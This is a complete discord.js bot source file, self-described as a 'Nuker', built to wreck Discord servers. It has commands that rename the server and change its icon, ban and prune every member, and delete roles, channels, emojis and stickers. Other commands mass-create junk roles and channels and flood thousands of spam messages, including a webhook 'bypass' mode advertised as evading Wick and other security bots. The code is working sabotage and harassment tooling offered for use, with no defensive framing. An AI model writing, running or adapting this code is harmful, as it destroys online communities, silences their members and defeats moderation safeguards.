const fs = require('fs');
const path = require('path');
const axios = require('axios');
const {
  Client,
  GatewayIntentBits,
  ChannelType,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require('discord.js');
const { token, imageUrl, message } = require('./config.json');
const { newName, banReason, roleName, channelName } = require('./setup.json');
const chalk = require('chalk');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.once('ready', () => {
  console.log(chalk.green(`Logged in as ${client.user.tag}!`));
});

client.on('messageCreate', async (msg) => {
  const guild = msg.guild;

  if (!guild) {
    console.log(chalk.red('Command not used in a server.'));
    return;
  }

  if (msg.content.startsWith('!kill')) {
    await handleKillCommand(guild);
  }

  if (msg.content.startsWith('!s name')) {
    await renameServer(guild, newName);
  }

  if (msg.content.startsWith('!s logo')) {
    await changeServerIcon(guild, imageUrl);
  }

  if (msg.content.startsWith('!prune')) {
    await pruneMembers(guild);
  }

  if (msg.content.startsWith('!ban all')) {
    await banAllMembers(guild, banReason);
  }

  if (msg.content.startsWith('!r delete')) {
    await deleteRoles(guild, roleName);
  }

  if (msg.content.startsWith('!r create')) {
    await createRoles(guild, roleName, 30);
  }

  if (msg.content.startsWith('!e delete')) {
    await deleteEmojisAndStickers(guild);
  }

  if (msg.content.startsWith('!c delete')) {
    await deleteChannels(guild);
  }

  if (msg.content.startsWith('!c create')) {
    await createChannels(guild, channelName, 30);
  }

  if (msg.content.startsWith('!send')) {
    await sendMessagesToChannels(guild, message, 5000);
  }

  if (msg.content.startsWith('!bypass')) {
    await bypassMode(guild, channelName, message);
  }

  if (msg.content.startsWith('!steal')) {
    const args = msg.content.split(' ').slice(1);
    if (args.length < 2) {
      msg.reply('Usage: `!steal {emoji} {no.of times}`');
      return;
    }

    const emoji = args[0];
    const times = parseInt(args[1], 10);
    if (isNaN(times) || times <= 0) {
      msg.reply('The number of times must be a positive integer.');
      return;
    }

    await stealEmoji(guild, emoji, times, msg);
  }

  if (msg.content.startsWith('!help')) {
    await sendHelpMessage(msg.channel);
  }
});

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function handleKillCommand(guild) {
  console.log(chalk.blue('Executing !kill command...'));

  await renameServer(guild, newName);
  await delay(1000);

  await changeServerIcon(guild, imageUrl);
  await delay(1000);

  await pruneMembers(guild);
  await delay(1000);

  console.log(chalk.blue('Banning all members (including bots and everyone else)...'));
  await banAllMembers(guild, banReason);
  await delay(1000);

  await deleteRoles(guild, roleName);
  await delay(1000);

  await createRoles(guild, roleName, 30);
  await delay(1000);

  await deleteEmojisAndStickers(guild);
  await delay(1000);

  await deleteChannels(guild);
  await delay(1000);

  await createChannels(guild, channelName, 30);
  await delay(1000);

  await sendMessagesToChannels(guild, message, 50);
  console.log(chalk.green('!kill command executed successfully.'));
}

async function banAllMembers(guild, reason) {
  const banPromises = guild.members.cache.map(async (member) => {
    try {
      await member.ban({ reason });
      console.log(chalk.green(`Banned member: ${member.user.tag}`));
    } catch (error) {
      console.log(chalk.red(`Failed to ban: ${member.user.tag}. Error: ${error.message}`));
    }
  });

  await Promise.all(banPromises);
  console.log(chalk.green('Ban all members operation completed.'));
}

async function stealEmoji(guild, emojiInput, times, msg) {
  try {
    const emojiMatch = emojiInput.match(/<a?:\w+:(\d+)>/);
    if (!emojiMatch) {
      msg.reply('Invalid emoji format. Use a custom emoji like `<:name:123456789012345678>`.');
      return;
    }

    const emojiId = emojiMatch[1];
    const emojiUrl = `https://cdn.discordapp.com/emojis/${emojiId}.png`;

    if (guild.emojis.cache.size + times > guild.maximumEmojis) {
      msg.reply(`Cannot add more than the server's emoji limit (${guild.maximumEmojis}).`);
      return;
    }

    for (let i = 0; i < times; i++) {
      const emojiFilename = `data_${Date.now()}_${i}.png`;
      const emojiPath = path.join(__dirname, emojiFilename);

      const response = await axios.get(emojiUrl, { responseType: 'arraybuffer' });
      fs.writeFileSync(emojiPath, response.data);
      console.log(chalk.green(`Downloaded emoji to ${emojiPath}`));

      const emojiName = `hateop_${i + 1}`;
      try {
        const emoji = await guild.emojis.create({ attachment: emojiPath, name: emojiName });
        console.log(chalk.green(`Added emoji: ${emoji.name}`));
      } catch (error) {
        console.log(chalk.red(`Error adding emoji: ${error.message}`));
      }

      fs.unlinkSync(emojiPath);
      console.log(chalk.green(`Deleted temporary file: ${emojiPath}`));
    }

    msg.reply(`Successfully added ${times} emojis.`);
  } catch (error) {
    console.log(chalk.red(`Error in !steal command: ${error.message}`));
    msg.reply('An error occurred while processing the emoji. Please check the input and try again.');
  }
}

async function renameServer(guild, name) {
  try {
    await guild.setName(name);
    console.log(chalk.green(`Server renamed to ${name}`));
  } catch (error) {
    console.log(chalk.red(`Error renaming server: ${error.message}`));
  }
}

async function changeServerIcon(guild, iconUrl) {
  try {
    await guild.setIcon(iconUrl);
    console.log(chalk.green('Server icon changed.'));
  } catch (error) {
    console.log(chalk.red(`Error changing server icon: ${error.message}`));
  }
}

async function pruneMembers(guild) {
  try {
    const prunedCount = await guild.members.prune({ days: 1, reason: 'Server Nuked!!' });
    console.log(chalk.green(`Pruned ${prunedCount} inactive members.`));
  } catch (error) {
    console.log(chalk.red(`Error pruning members: ${error.message}`));
  }
}

async function deleteRoles(guild, excludedRoleName) {
  const deletePromises = guild.roles.cache.map(async (role) => {
    if (role.name === excludedRoleName || role.managed || !role.editable) {
      console.log(chalk.red(`Skipped deleting role: ${role.name}`));
      return;
    }
    try {
      await role.delete();
      console.log(chalk.green(`Deleted role: ${role.name}`));
    } catch (error) {
      console.log(chalk.red(`Error deleting role: ${role.name}, ${error.message}`));
    }
  });

  await Promise.all(deletePromises);
}

async function createRoles(guild, name, count) {
  const createPromises = Array.from({ length: count }, async () => {
    try {
      await guild.roles.create({ name, color: 'Red', reason: 'Server Nuked!!' });
      console.log(chalk.green(`Created role: ${name}`));
    } catch (error) {
      console.log(chalk.red(`Error creating role: ${name}, ${error.message}`));
    }
  });

  await Promise.all(createPromises);
}

async function deleteEmojisAndStickers(guild) {
  const deletePromises = [
    ...guild.emojis.cache.map((emoji) => emoji.delete()),
    ...guild.stickers.cache.map((sticker) => sticker.delete()),
  ];
  await Promise.all(deletePromises);
}

async function deleteChannels(guild) {
  const deletePromises = guild.channels.cache.map(async (channel) => {
    try {
      await channel.delete();
      console.log(chalk.green(`Deleted channel: ${channel.name}`));
    } catch (error) {
      console.log(chalk.red(`Error deleting channel: ${channel.name}, ${error.message}`));
    }
  });
  await Promise.all(deletePromises);
}

async function createChannels(guild, name, count) {
  const createPromises = Array.from({ length: count }, async () => {
    try {
      const channel = await guild.channels.create({ name, type: ChannelType.GuildText, reason: 'Server Nuked!!' });
      console.log(chalk.green(`Created channel: ${channel.name}`));
    } catch (error) {
      console.log(chalk.red(`Error creating channel: ${name}, ${error.message}`));
    }
  });

  await Promise.all(createPromises);
}

async function sendMessagesToChannels(guild, msgContent, count) {
  const textChannels = guild.channels.cache.filter((channel) => channel.type === ChannelType.GuildText);
  const sendPromises = Array.from({ length: count }, (_, i) => {
    const channel = Array.from(textChannels.values())[i % textChannels.size];
    return channel.send(msgContent);
  });
  await Promise.all(sendPromises);
}

async function bypassMode(guild, targetChannelName, msgContent) {
  console.log(chalk.blue('Executing !bypass command...'));

  const renamePromises = guild.channels.cache.map(async (channel) => {
    try {
      await channel.setName(targetChannelName);
      console.log(chalk.green(`Renamed channel: ${channel.name}`));
    } catch (error) {
      console.log(chalk.red(`Error renaming channel: ${error.message}`));
    }
  });
  await Promise.all(renamePromises);

  const webhooks = [];
  const webhookCreationPromises = guild.channels.cache.map(async (channel) => {
    if (channel.type === ChannelType.GuildText) {
      try {
        const webhook = await channel.createWebhook({ name: targetChannelName });
        webhooks.push(webhook);
        console.log(chalk.green(`Created webhook in channel: ${channel.name}`));
      } catch (error) {
        console.log(chalk.red(`Error creating webhook: ${error.message}`));
      }
    }
  });

  await Promise.all(webhookCreationPromises);

  const totalMessages = 5000;
  const messagesPerWebhook = Math.ceil(totalMessages / webhooks.length);
  const messageSendingPromises = webhooks.flatMap((webhook) =>
    Array.from({ length: messagesPerWebhook }).map(async () => {
      try {
        await webhook.send(msgContent);
        console.log(chalk.green(`Message sent via webhook: ${webhook.name}`));
      } catch (error) {
        console.log(chalk.red(`Error sending message via webhook: ${error.message}`));
      }
    })
  );

  await Promise.all(messageSendingPromises);
  console.log(chalk.green('All messages sent via webhooks.'));
}

async function sendHelpMessage(channel) {
  const embed = new EmbedBuilder()
    .setTitle('Nuker Commands')
    .setColor('Blue')
    .setDescription('Here is the list of available commands:')
    .addFields(
      { name: '!kill', value: 'Fastest and bestest all in one nuke command.' },
      { name: '!bypass', value: 'Bypass Wick + Security bots' },
      { name: '!s name', value: 'Changes the server name.' },
      { name: '!s logo', value: 'Changes the server nuked.' },
      { name: '!prune', value: 'Prunes 1d members.' },
      { name: '!ban all', value: 'Bans all members.' },
      { name: '!r delete', value: 'Deletes server roles.' },
      { name: '!r create', value: 'Creates nuked roles.' },
      { name: '!e delete', value: 'Deletes emojis and stickers.' },
      { name: '!c delete', value: 'Deletes channels.' },
      { name: '!c create', value: 'Creates nuked channels.' },
      { name: '!send', value: 'Spam messages to text channels.' },
      { name: '!steal', value: 'Spam Emoji Adding.' }
    )
    .setFooter({ text: 'World No.1 Nuker' });

  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setLabel('Support Server')
      .setURL('https://discord.gg/hateop')
      .setStyle(ButtonStyle.Link)
  );

  await channel.send({ embeds: [embed], components: [button] });
}

client.login(token);
